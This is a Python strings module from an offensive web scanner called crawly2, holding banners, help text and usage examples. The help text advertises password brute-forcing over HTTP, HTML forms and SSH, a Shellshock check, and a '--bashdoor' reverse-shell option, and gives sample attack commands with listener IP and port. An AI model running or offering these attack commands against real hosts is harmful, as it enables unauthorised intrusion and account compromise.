# -*- coding: utf-8 -*-
# Part of crawly2

import platform
from colorama import *
# Modules
import version

class Strings:
    def __init__(self):
        self.version = version.__version__

        if platform.system() == ("Linux" or "Darwin"):
            # --> UNIX colors
            self.R = "\033[91m"
            self.O = "\033[0m"
            self.G = "\033[32m"
            self.Y = "\033[93m"
            self.B = "\033[94m"
            self.BOLD = "\033[1m"
            self.ERROR = self.R + "[ERROR] " + self.O
            self.PASS = self.G + "[+] " + self.O
            self.INFO = self.B + self.BOLD + "[INFO] " + self.O
            self.MED = self.Y + "[~] " + self.O
            self.SEMI = self.Y + "[+] " + self.O
            self.OOPS = self.R + self.BOLD + "[OOPS!] " + self.O
            self.OH = self.G + self.BOLD + "[OH!] " + self.O
            self.PLUS = self.B + self.BOLD + "[+] " + self.O

        elif platform.system() == "Windows":
            init()
            # --> Windows colors
            self.R = Fore.RED
            self.O = Fore.RESET
            self.G = Fore.GREEN
            self.Y = Fore.YELLOW
            self.B = Fore.BLUE
            self.BOLD = Style.BRIGHT
            self.ERROR = self.R + "[ERROR] " + self.O
            self.PASS = self.G + "[+] " + self.O
            self.INFO = self.B + self.BOLD + "[INFO] " + self.O
            self.MED = self.Y + "[~] " + self.O
            self.SEMI = self.Y + "[+] " + self.O
            self.OOPS = self.R + self.BOLD + "[OOPS!] " + self.O
            self.OH = self.G + self.BOLD + "[OH!] " + self.O
            self.PLUS + self.B + self.BOLD + "[+] " + self.O

    def randheaders(self):
        head = [self.BOLD + '''
 ▄████▄   ██▀███   ▄▄▄       █     █░ ██▓   ▓██   ██▓   
▒██▀ ▀█  ▓██ ▒ ██▒▒████▄    ▓█░ █ ░█░▓██▒    ▒██  ██▒   
▒▓█    ▄ ▓██ ░▄█ ▒▒██  ▀█▄  ▒█░ █ ░█ ▒██░     ▒██ ██░   
▒▓▓▄ ▄██▒▒██▀▀█▄  ░██▄▄▄▄██ ░█░ █ ░█ ▒██░     ░ ▐██▓░   
▒ ▓███▀ ░░██▓ ▒██▒ ▓█   ▓██▒░░██▒██▓ ░██████▒ ░ ██▒▓░   
░ ░▒ ▒  ░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ▓░▒ ▒  ░ ▒░▓  ░  ██▒▒▒    
  ░  ▒     ░▒ ░ ▒░  ▒   ▒▒ ░  ▒ ░ ░  ░ ░ ▒  ░▓██ ░▒░    
░          ░░   ░   ░   ▒     ░   ░    ░ ░   ▒ ▒ ░░     
░ ░         ░           ░  ░    ░        ░  ░░ ░        
░                                            ░ ░
	           __Helix__.py       
		''' + self.O,

		  self.BOLD + self.R + '''                                                   
                                            ,--,              
                                          ,--.'|              
           __  ,-.                   .---.|  | :              
         ,' ,'/ /|                  /. ./|:  : '              
   ,---. '  | |' | ,--.--.       .-'-. ' ||  ' |        .--,  
  /     \|  |   ,'/       \     /___/ \: |'  | |      /_ ./|  
 /    / ''  :  / .--.  .-. | .-'.. '   ' .|  | :   , ' , ' :  
.    ' / |  | '   \__\/: . ./___/ \:     ''  : |__/___/ \: |  
'   ; :__;  : |   ," .--.; |.   \  ' .\   |  | '.'|.  \  ' |  
'   | '.'|  , ;  /  /  ,.  | \   \   ' \ |;  :    ; \  ;   :  
|   :    :---'  ;  :   .'   \ \   \  |--" |  ,   /   \  \  ;  
 \   \  /       |  ,     .-./  \   \ |     ---`-'     :  \  \ 
  `----'         `--`---'       '---"      _Helix.     \  ' ; 
                                                        `--`
        ''' + self.O]
        #return random.choice(head) // Windows can't read [0, 2]
        return head

    def help(self):
        helpstr = '''\033[1;94mSimple python web scanner written by Helix.\033[0m

| You don't need to care about wordlists
| This program had his own wordlists
| But, you can specify your wordlists
| with [-w/--wordlist]

\033[1mBase Options:\033[0m
    [-h/--help] -- Print help.
    [--usage] -- Print some samples of program usage.
    [-v/--version] -- Print version.
    [--quiet] -- Don't print headers.
    [--check-update] -- Check if crawly is up to date.
    [--upgrade] -- Upgrade crawly.
    [--refresh] -- Refreshing crawly files.

\033[1mScan Options:\033[0m
    [-u/--url] www.google.com -- Specify URL.
    [--crawl] -- Enable crawling mode.
    [--dir] -- Enable dirbruter mode.
    [--random-agent] -- Use random user agents.
    [--common] -- Brute force with common directorys, option --dir not needed.
    [--dns] -- Brute force subdomains of an host. The host must not have 'www.' or something else.
    [-w/--wordlist] /path -- Specify a wordlist for option [--dns] and [--dir]
    [-t/--threads] 50 -- Number of threads. Default '35'.
    [-c] 200,302 -- HTTP codes to check. Default '200'.

\033[1mAttack Options:\033[0m

| These options can attack an host by
| simple exploits, like shellshock.
| Or perform some bruteforce attacks.
|
| A ssh bruteforcer is implanted
| but this function is still
| experimental.

    [-A] www.host.com -- Specify the host to be attacked.
    [-U] user -- HTML username field of the page
    [-P] pass -- HTML password field of the page
    [--user] admin -- Username to brute
    [--lhost] -- Ip of the listener.
    [--lport] -- PORT of the listener.
    [--err]="Error message" -- Error message returned by the web page
    [-m/--method] http/html/ssh -- Used methods to bruteforce
    [-w/--wordlist]
    [-t/--threads]
    [--shellshock] -- Try shellshock on gived path like /cgi-bin/
    [--bashdoor] -- Get a shell from shellshock vulnerable website.
\033[1mVersion: '''+ self.version + self.O
        
        return helpstr

    def FirstRun(self):
        return '''
\033[94m\033[1m[+]\033[0m\033[1m Welcome to Crawly!\033[0m

        Type [crawly --help] or [crawly --usage]
        to get all the options.

        See the documentation in the directory
        *doc/* to know how to use me ;)

\033[93m\033[1mSee Ya! @Helix\033[0m
        '''

    def usage(self):
        return '''
\033[1mUsage:\033[0m
    ./crawly.py [-u] www.google.com
    ./crawly.py [-u] www.google.com [--crawl]
    ./crawly.py [-u] www.apple.com [--dir]
    ./crawly.py [-u] www.apple.com [--common]
    ./crawly.py [-u] microsoft.com [--dns] [-t 50] [-w wordlists/subdom.lst] 
    ./crawly.py [-u] www.microsoft.com [--dir] [--random-agent]
    ./crawly.py [-u] www.test.com [-c] 403,302 [--dir] 
    ./crawly.py [-A] www.host.com/cgi-bin/formmail.cgi [--lhost] 192.168.1.30 [--lport] 4444 [--bashdoor]
    ./crawly.py [-A] www.host.com/http -m HTTP --user admin -w passwd/list.lst -t 45
    ./crawly.py [-A] host.com/admin/index.php -m HTML -U username -P password --user admin [--err]="Error wrong pass" -w passlist.lst
\033[1mVersion: '''+ self.version
